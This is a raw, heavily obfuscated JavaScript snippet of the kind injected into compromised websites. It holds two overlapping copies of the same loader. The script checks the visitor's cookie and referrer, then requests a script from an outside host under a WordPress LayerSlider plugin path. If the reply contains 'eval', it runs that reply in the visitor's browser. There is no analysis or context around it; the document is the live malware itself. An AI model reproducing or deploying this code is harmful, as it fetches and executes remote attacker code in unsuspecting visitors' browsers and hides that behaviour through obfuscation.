V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};